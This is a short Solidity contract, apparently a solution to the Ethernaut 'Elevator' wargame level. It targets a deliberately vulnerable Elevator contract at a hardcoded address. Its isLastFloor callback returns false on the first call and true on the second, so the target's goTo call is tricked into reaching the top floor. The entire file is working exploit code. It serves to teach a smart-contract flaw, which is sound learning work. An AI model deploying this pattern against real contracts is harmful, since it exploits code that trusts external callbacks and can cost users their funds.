// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract HackBuidling {
    Elevator public original = Elevator(0xdfB0f070829dC3295a335Ef927033a8EAc6Ed6AF);
    bool public flag = false;

    function isLastFloor(uint) public returns (bool) {
        // first call
        if (! flag) {
            flag = true;
            return false;
        // second call
        } else {
            flag = false;
            return true;
        }
    }

    function callElevetor() public {
        // call the elevator script with any int and the original contract will call this contract which will return true
        original.goTo(1);
    }
}